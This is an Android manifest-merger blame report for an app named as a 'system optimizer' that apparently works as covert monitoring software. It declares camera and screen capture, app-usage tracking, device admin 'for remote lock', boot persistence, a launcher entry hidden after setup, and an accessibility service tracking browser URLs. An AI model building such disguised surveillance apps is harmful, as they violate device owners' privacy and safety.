android-agent/app/build/intermediates/manifest_merge_blame_file/debug/manifest-merger-blame-debug-report.txt
1<?xml version="1.0" encoding="utf-8"?>
2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
3    package="com.system.service.optimizer"
4    android:versionCode="1"
5    android:versionName="1.0.0" >
6
7    <uses-sdk
8        android:minSdkVersion="30"
9        android:targetSdkVersion="33" />
10
11    <!-- Network -->
12    <uses-permission android:name="android.permission.INTERNET" />
12-->src/main/AndroidManifest.xml:6:5-67
12-->src/main/AndroidManifest.xml:6:22-64
13    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
13-->src/main/AndroidManifest.xml:7:5-79
13-->src/main/AndroidManifest.xml:7:22-76
14
15    <!-- Background service -->
16    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
16-->src/main/AndroidManifest.xml:10:5-77
16-->src/main/AndroidManifest.xml:10:22-74
17    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
17-->src/main/AndroidManifest.xml:11:5-94
17-->src/main/AndroidManifest.xml:11:22-91
18    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
18-->src/main/AndroidManifest.xml:12:5-84
18-->src/main/AndroidManifest.xml:12:22-81
19    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
19-->src/main/AndroidManifest.xml:13:5-87
19-->src/main/AndroidManifest.xml:13:22-84
20    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
20-->src/main/AndroidManifest.xml:14:5-89
20-->src/main/AndroidManifest.xml:14:22-86
21    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
21-->src/main/AndroidManifest.xml:15:5-78
21-->src/main/AndroidManifest.xml:15:22-75
22    <uses-permission android:name="android.permission.WAKE_LOCK" />
22-->src/main/AndroidManifest.xml:16:5-68
22-->src/main/AndroidManifest.xml:16:22-65
23    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
23-->src/main/AndroidManifest.xml:17:5-81
23-->src/main/AndroidManifest.xml:17:22-78
24    <!-- Camera capture -->
25    <uses-permission android:name="android.permission.CAMERA" />
25-->src/main/AndroidManifest.xml:19:5-65
25-->src/main/AndroidManifest.xml:19:22-62
26
27    <uses-feature
27-->src/main/AndroidManifest.xml:20:5-85
28        android:name="android.hardware.camera"
28-->src/main/AndroidManifest.xml:20:19-57
29        android:required="false" />
29-->src/main/AndroidManifest.xml:20:58-82
30    <uses-feature
30-->src/main/AndroidManifest.xml:21:5-95
31        android:name="android.hardware.camera.autofocus"
31-->src/main/AndroidManifest.xml:21:19-67
32        android:required="false" />
32-->src/main/AndroidManifest.xml:21:68-92
33
34    <!-- App monitoring -->
35    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
35-->src/main/AndroidManifest.xml:24:5-25:47
35-->src/main/AndroidManifest.xml:24:22-75
36    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
36-->src/main/AndroidManifest.xml:26:5-27:53
36-->src/main/AndroidManifest.xml:26:22-74
37
38    <permission
38-->[androidx.core:core:1.12.0] AndroidManifest.xml:22:5-24:47
39        android:name="com.system.service.optimizer.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
39-->[androidx.core:core:1.12.0] AndroidManifest.xml:23:9-81
40        android:protectionLevel="signature" />
40-->[androidx.core:core:1.12.0] AndroidManifest.xml:24:9-44
41
42    <uses-permission android:name="com.system.service.optimizer.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION" />
42-->[androidx.core:core:1.12.0] AndroidManifest.xml:26:5-97
42-->[androidx.core:core:1.12.0] AndroidManifest.xml:26:22-94
43
44    <application
44-->src/main/AndroidManifest.xml:29:5-105:19
45        android:allowBackup="false"
45-->src/main/AndroidManifest.xml:30:9-36
46        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
46-->[androidx.core:core:1.12.0] AndroidManifest.xml:28:18-86
47        android:debuggable="true"
48        android:extractNativeLibs="false"
49        android:icon="@mipmap/ic_launcher"
49-->src/main/AndroidManifest.xml:31:9-43
50        android:label="@string/app_name"
50-->src/main/AndroidManifest.xml:32:9-41
51        android:supportsRtl="true"
51-->src/main/AndroidManifest.xml:33:9-35
52        android:theme="@style/Theme.SystemOptimizer"
52-->src/main/AndroidManifest.xml:34:9-53
53        android:usesCleartextTraffic="true" >
53-->src/main/AndroidManifest.xml:35:9-44
54
55        <!-- Setup Activity (hidden from launcher after setup) -->
56        <activity
56-->src/main/AndroidManifest.xml:39:9-49:20
57            android:name="com.system.optimizer.MainActivity"
57-->src/main/AndroidManifest.xml:40:13-41
58            android:excludeFromRecents="true"
58-->src/main/AndroidManifest.xml:42:13-46
59            android:exported="true"
59-->src/main/AndroidManifest.xml:41:13-36
60            android:label="@string/app_name"
60-->src/main/AndroidManifest.xml:43:13-45
61            android:theme="@style/Theme.SystemOptimizer" >
61-->src/main/AndroidManifest.xml:44:13-57
62            <intent-filter>
62-->src/main/AndroidManifest.xml:45:13-48:29
63                <action android:name="android.intent.action.MAIN" />
63-->src/main/AndroidManifest.xml:46:17-69
63-->src/main/AndroidManifest.xml:46:25-66
64
65                <category android:name="android.intent.category.LAUNCHER" />
65-->src/main/AndroidManifest.xml:47:17-77
65-->src/main/AndroidManifest.xml:47:27-74
66            </intent-filter>
67        </activity>
68        <activity
68-->src/main/AndroidManifest.xml:51:9-57:75
69            android:name="com.system.optimizer.monitor.CameraDummyActivity"
69-->src/main/AndroidManifest.xml:52:13-56
70            android:excludeFromRecents="true"
70-->src/main/AndroidManifest.xml:54:13-46
71            android:exported="false"
71-->src/main/AndroidManifest.xml:53:13-37
72            android:launchMode="singleInstance"
72-->src/main/AndroidManifest.xml:56:13-48
73            android:taskAffinity=""
73-->src/main/AndroidManifest.xml:55:13-36
74            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
74-->src/main/AndroidManifest.xml:57:13-72
75
76        <!-- Background Monitoring Service -->
77        <service
77-->src/main/AndroidManifest.xml:60:9-64:90
78            android:name="com.system.optimizer.service.MonitoringService"
78-->src/main/AndroidManifest.xml:61:13-54
79            android:enabled="true"
79-->src/main/AndroidManifest.xml:62:13-35
80            android:exported="false"
80-->src/main/AndroidManifest.xml:63:13-37
81            android:foregroundServiceType="mediaProjection|camera|dataSync|specialUse" />
81-->src/main/AndroidManifest.xml:64:13-87
82
83        <!-- Device Admin (for remote lock) -->
84        <receiver
84-->src/main/AndroidManifest.xml:67:9-77:20
85            android:name="com.system.optimizer.admin.AdminReceiver"
85-->src/main/AndroidManifest.xml:68:13-48
86            android:exported="true"
86-->src/main/AndroidManifest.xml:69:13-36
87            android:permission="android.permission.BIND_DEVICE_ADMIN" >
87-->src/main/AndroidManifest.xml:70:13-70
88            <meta-data
88-->src/main/AndroidManifest.xml:71:13-73:56
89                android:name="android.app.device_admin"
89-->src/main/AndroidManifest.xml:72:17-56
90                android:resource="@xml/device_admin" />
90-->src/main/AndroidManifest.xml:73:17-53
91
92            <intent-filter>
92-->src/main/AndroidManifest.xml:74:13-76:29
93                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
93-->src/main/AndroidManifest.xml:75:17-82
93-->src/main/AndroidManifest.xml:75:25-79
94            </intent-filter>
95        </receiver>
96
97        <!-- Auto-start on boot or APK update -->
98        <receiver
98-->src/main/AndroidManifest.xml:80:9-89:20
99            android:name="com.system.optimizer.service.BootReceiver"
99-->src/main/AndroidManifest.xml:81:13-49
100            android:enabled="true"
100-->src/main/AndroidManifest.xml:83:13-35
101            android:exported="true" >
101-->src/main/AndroidManifest.xml:82:13-36
102            <intent-filter>
102-->src/main/AndroidManifest.xml:84:13-88:29
103                <action android:name="android.intent.action.BOOT_COMPLETED" />
103-->src/main/AndroidManifest.xml:85:17-79
103-->src/main/AndroidManifest.xml:85:25-76
104                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
104-->src/main/AndroidManifest.xml:86:17-82
104-->src/main/AndroidManifest.xml:86:25-79
105                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
105-->src/main/AndroidManifest.xml:87:17-84
105-->src/main/AndroidManifest.xml:87:25-81
106            </intent-filter>
107        </receiver>
108
109        <!-- Browser URL Tracker (Accessibility Service) -->
110        <service
110-->src/main/AndroidManifest.xml:92:9-103:19
111            android:name="com.system.optimizer.monitor.BrowserTracker"
111-->src/main/AndroidManifest.xml:93:13-51
112            android:exported="false"
112-->src/main/AndroidManifest.xml:94:13-37
113            android:label="@string/app_name"
113-->src/main/AndroidManifest.xml:95:13-45
114            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" >
114-->src/main/AndroidManifest.xml:96:13-79
115            <intent-filter>
115-->src/main/AndroidManifest.xml:97:13-99:29
116                <action android:name="android.accessibilityservice.AccessibilityService" />
116-->src/main/AndroidManifest.xml:98:17-92
116-->src/main/AndroidManifest.xml:98:25-89
117            </intent-filter>
118
119            <meta-data
119-->src/main/AndroidManifest.xml:100:13-102:72
120                android:name="android.accessibilityservice"
120-->src/main/AndroidManifest.xml:101:17-60
121                android:resource="@xml/accessibility_service_config" />
121-->src/main/AndroidManifest.xml:102:17-69
122        </service>
123
124        <provider
124-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:24:9-32:20
125            android:name="androidx.startup.InitializationProvider"
125-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:25:13-67
126            android:authorities="com.system.service.optimizer.androidx-startup"
126-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:26:13-68
127            android:exported="false" >
127-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:27:13-37
128            <meta-data
128-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:29:13-31:52
129                android:name="androidx.emoji2.text.EmojiCompatInitializer"
129-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:30:17-75
130                android:value="androidx.startup" />
130-->[androidx.emoji2:emoji2:1.2.0] AndroidManifest.xml:31:17-49
131            <meta-data
131-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:34:13-36:52
132                android:name="androidx.work.WorkManagerInitializer"
132-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:35:17-68
133                android:value="androidx.startup" />
133-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:36:17-49
134            <meta-data
134-->[androidx.lifecycle:lifecycle-process:2.4.1] AndroidManifest.xml:31:13-33:52
135                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
135-->[androidx.lifecycle:lifecycle-process:2.4.1] AndroidManifest.xml:32:17-78
136                android:value="androidx.startup" />
136-->[androidx.lifecycle:lifecycle-process:2.4.1] AndroidManifest.xml:33:17-49
137        </provider>
138
139        <service
139-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:39:9-45:35
140            android:name="androidx.work.impl.background.systemalarm.SystemAlarmService"
140-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:40:13-88
141            android:directBootAware="false"
141-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:41:13-44
142            android:enabled="@bool/enable_system_alarm_service_default"
142-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:42:13-72
143            android:exported="false" />
143-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:43:13-37
144        <service
144-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:46:9-52:35
145            android:name="androidx.work.impl.background.systemjob.SystemJobService"
145-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:47:13-84
146            android:directBootAware="false"
146-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:48:13-44
147            android:enabled="@bool/enable_system_job_service_default"
147-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:49:13-70
148            android:exported="true"
148-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:50:13-36
149            android:permission="android.permission.BIND_JOB_SERVICE" />
149-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:51:13-69
150        <service
150-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:53:9-59:35
151            android:name="androidx.work.impl.foreground.SystemForegroundService"
151-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:54:13-81
152            android:directBootAware="false"
152-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:55:13-44
153            android:enabled="@bool/enable_system_foreground_service_default"
153-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:56:13-77
154            android:exported="false" />
154-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:57:13-37
155
156        <receiver
156-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:61:9-66:35
157            android:name="androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver"
157-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:62:13-88
158            android:directBootAware="false"
158-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:63:13-44
159            android:enabled="true"
159-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:64:13-35
160            android:exported="false" />
160-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:65:13-37
161        <receiver
161-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:67:9-77:20
162            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryChargingProxy"
162-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:68:13-106
163            android:directBootAware="false"
163-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:69:13-44
164            android:enabled="false"
164-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:70:13-36
165            android:exported="false" >
165-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:71:13-37
166            <intent-filter>
166-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:73:13-76:29
167                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
167-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:74:17-87
167-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:74:25-84
168                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
168-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:75:17-90
168-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:75:25-87
169            </intent-filter>
170        </receiver>
171        <receiver
171-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:78:9-88:20
172            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryNotLowProxy"
172-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:79:13-104
173            android:directBootAware="false"
173-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:80:13-44
174            android:enabled="false"
174-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:81:13-36
175            android:exported="false" >
175-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:82:13-37
176            <intent-filter>
176-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:84:13-87:29
177                <action android:name="android.intent.action.BATTERY_OKAY" />
177-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:85:17-77
177-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:85:25-74
178                <action android:name="android.intent.action.BATTERY_LOW" />
178-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:86:17-76
178-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:86:25-73
179            </intent-filter>
180        </receiver>
181        <receiver
181-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:89:9-99:20
182            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$StorageNotLowProxy"
182-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:90:13-104
183            android:directBootAware="false"
183-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:91:13-44
184            android:enabled="false"
184-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:92:13-36
185            android:exported="false" >
185-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:93:13-37
186            <intent-filter>
186-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:95:13-98:29
187                <action android:name="android.intent.action.DEVICE_STORAGE_LOW" />
187-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:96:17-83
187-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:96:25-80
188                <action android:name="android.intent.action.DEVICE_STORAGE_OK" />
188-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:97:17-82
188-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:97:25-79
189            </intent-filter>
190        </receiver>
191        <receiver
191-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:100:9-109:20
192            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$NetworkStateProxy"
192-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:101:13-103
193            android:directBootAware="false"
193-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:102:13-44
194            android:enabled="false"
194-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:103:13-36
195            android:exported="false" >
195-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:104:13-37
196            <intent-filter>
196-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:106:13-108:29
197                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
197-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:107:17-79
197-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:107:25-76
198            </intent-filter>
199        </receiver>
200        <receiver
200-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:110:9-121:20
201            android:name="androidx.work.impl.background.systemalarm.RescheduleReceiver"
201-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:111:13-88
202            android:directBootAware="false"
202-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:112:13-44
203            android:enabled="false"
203-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:113:13-36
204            android:exported="false" >
204-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:114:13-37
205            <intent-filter>
205-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:116:13-120:29
206                <action android:name="android.intent.action.BOOT_COMPLETED" />
206-->src/main/AndroidManifest.xml:85:17-79
206-->src/main/AndroidManifest.xml:85:25-76
207                <action android:name="android.intent.action.TIME_SET" />
207-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:118:17-73
207-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:118:25-70
208                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
208-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:119:17-81
208-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:119:25-78
209            </intent-filter>
210        </receiver>
211        <receiver
211-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:122:9-131:20
212            android:name="androidx.work.impl.background.systemalarm.ConstraintProxyUpdateReceiver"
212-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:123:13-99
213            android:directBootAware="false"
213-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:124:13-44
214            android:enabled="@bool/enable_system_alarm_service_default"
214-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:125:13-72
215            android:exported="false" >
215-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:126:13-37
216            <intent-filter>
216-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:128:13-130:29
217                <action android:name="androidx.work.impl.background.systemalarm.UpdateProxies" />
217-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:129:17-98
217-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:129:25-95
218            </intent-filter>
219        </receiver>
220        <receiver
220-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:132:9-142:20
221            android:name="androidx.work.impl.diagnostics.DiagnosticsReceiver"
221-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:133:13-78
222            android:directBootAware="false"
222-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:134:13-44
223            android:enabled="true"
223-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:135:13-35
224            android:exported="true"
224-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:136:13-36
225            android:permission="android.permission.DUMP" >
225-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:137:13-57
226            <intent-filter>
226-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:139:13-141:29
227                <action android:name="androidx.work.diagnostics.REQUEST_DIAGNOSTICS" />
227-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:140:17-88
227-->[androidx.work:work-runtime:2.9.0] AndroidManifest.xml:140:25-85
228            </intent-filter>
229        </receiver>
230
231        <service
231-->[androidx.room:room-runtime:2.5.0] AndroidManifest.xml:24:9-28:63
232            android:name="androidx.room.MultiInstanceInvalidationService"
232-->[androidx.room:room-runtime:2.5.0] AndroidManifest.xml:25:13-74
233            android:directBootAware="true"
233-->[androidx.room:room-runtime:2.5.0] AndroidManifest.xml:26:13-43
234            android:exported="false" />
234-->[androidx.room:room-runtime:2.5.0] AndroidManifest.xml:27:13-37
235    </application>
236
237</manifest>